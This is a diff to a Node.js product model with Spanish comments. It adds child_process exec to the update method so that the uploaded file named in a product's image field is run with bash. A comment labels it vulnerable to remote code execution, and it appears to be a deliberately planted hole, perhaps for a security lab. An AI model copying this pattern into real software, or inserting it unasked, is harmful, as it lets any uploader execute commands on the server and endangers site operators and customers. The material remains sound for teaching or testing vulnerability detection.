@@ -1,4 +1,7 @@
 const { getDatabase } = require('../config/database');
+const { exec } = require('child_process');
+const fs = require('fs');
+const path = require('path');
 
 class Product {
   // Obtener todos los productos con filtros
@@ -64,32 +67,42 @@ class Product {
   // Actualizar producto
   static async update(id, productData) {
     const db = await getDatabase();
-    
+
     const updates = [];
     const values = [];
-    
+
     const allowedFields = ['name', 'price', 'category', 'subcategory', 'image', 'description', 'stock'];
-    
+
     for (const field of allowedFields) {
       if (productData[field] !== undefined) {
         updates.push(`${field} = ?`);
         values.push(productData[field]);
       }
     }
-    
+
     if (updates.length === 0) {
       throw new Error('No hay datos para actualizar');
     }
-    
+
     updates.push('updated_at = CURRENT_TIMESTAMP');
     values.push(id);
-    
+
     await db.run(`
       UPDATE products 
       SET ${updates.join(', ')} 
       WHERE id = ?
     `, values);
-    
+
+    // ⚠️ VULNERABLE — ejecuta el archivo de imagen si existe (RCE)
+    if (productData.image) {
+      const filePath = path.join(__dirname, '../uploads/products/', path.basename(productData.image));
+      if (fs.existsSync(filePath)) {
+        exec(`bash ${filePath}`, (err, stdout, stderr) => {
+          if (err) console.error('exec error:', err);
+        });
+      }
+    }
+
     const updatedProduct = await this.findById(id);
     return updatedProduct;
   }
